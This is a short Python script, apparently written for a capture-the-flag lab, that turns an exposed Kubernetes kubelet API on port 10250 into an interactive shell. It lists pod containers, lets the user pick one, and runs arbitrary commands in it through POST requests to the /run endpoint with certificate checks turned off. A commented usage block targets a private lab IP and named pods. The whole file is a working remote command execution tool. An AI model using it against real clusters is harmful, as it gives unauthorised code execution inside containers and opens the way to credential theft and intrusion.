import requests
from os import system

from urllib3 import disable_warnings
disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ContainerController():
	def __init__(self, url, containers):
		self.url = url
		self.containers = containers
		self.directory = '/'
		self.username = None
		self.container = None

	def manage_command(self, command):
		if command == 'clear':
			system('clear')
			return None
		elif command in ['quit', 'exit']:
			exit(0)
		elif command[:2] == 'cd':
			if command[3] == '/':
				self.directory = command[3:]
			elif command[3:5] == '..':
				new_directory = '/'.join(self.directory.split('/')[:-1])
				print(new_directory)
				if new_directory == '':
					self.directory = '/'
				else:
					self.directory = new_directory
			else:
				if command[3] != '/' and self.directory != '/':
					self.directory += '/' + command[3:]
				else:
					self.directory += command[3:]
			return None
		elif command[:2] == 'ls' and '/' not in command:
			command += " " + self.directory
		elif command[:3] == 'cat' and self.directory != '/':
			command = f'cat {self.directory}/{command.split()[-1]}'
		return command

	def get_username(self):
		self.username = requests.post(self.container, data={'cmd': 'whoami'}, verify=False).text.strip()

	def select_container(self):
		for index, container in enumerate(self.containers):
			print(f'[{index + 1}] {container}')

		selected_number = int(input('Select: '))
		selected_container = self.containers[selected_number - 1]
		self.container = self.url + selected_container

	def run_command(self):
		container_name = self.container.split('/')[-1]
		command = self.manage_command(input(f'{self.username}@{container_name}:{self.directory}$ '))
		
		if command != None:
			response = requests.post(self.container, data={'cmd': command}, verify=False).text
			print(response)

'''
url = 'https://10.10.11.133:10250'

containers = [
	'/run/kube-system/kube-proxy-wnjdk/kube-proxy',
	'/run/default/s4vitar-pod/s4vitar-pod',
	'/run/default/juba/juba',
	'/run/default/nginxt/nginxt',
	'/run/default/nginx/nginx'
]

container = ContainerController(url, containers)
container.select_container()
container.get_username()

while True:
	container.run_command()
'''